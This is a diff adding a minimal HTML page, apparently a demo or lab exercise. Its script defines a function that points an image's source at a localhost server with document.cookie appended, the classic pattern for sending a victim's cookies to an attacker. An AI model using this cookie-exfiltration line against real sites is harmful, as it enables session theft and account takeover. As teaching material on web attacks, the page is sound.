@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Title</title>
+    <meta charset="utf-8">
+    <script>
+        function changeImg() {
+            document.getElementById('pic1').src =`http://localhost:4200/img?cookie=${document.cookie}`;
+        }
+    </script>
+</head>
+<body>
+    <p><img id='pic1' src='http://localhost:4200/img'></p>
+</body>
+</html>
